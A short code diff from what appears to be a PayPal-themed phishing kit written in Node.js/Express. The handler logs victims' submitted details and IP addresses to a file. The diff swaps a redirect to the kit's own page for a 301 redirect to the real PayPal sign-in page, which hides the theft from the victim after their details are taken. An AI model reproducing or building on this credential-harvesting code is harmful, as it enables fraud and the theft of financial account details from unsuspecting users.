@@ -119,7 +119,11 @@ app.post(main_url+'/signin/settings',function (req,res) {
         txt += '<br>ip :'+get_ip(req).clientIp;
         txt = `<p>${txt}</p><hr>`;
         save(file,txt);
-        res.end('<script>location = "'+ main_url +'/security?'+ options +'" </script>');
+       // res.end('<script>location = "'+ main_url +'/security?'+ options +'" </script>');
+        res.writeHead(301,
+            {Location: 'https://www.paypal.com/signin?country.x=US&locale.x=en_US'}
+        );
+        res.end();
 
     });
 
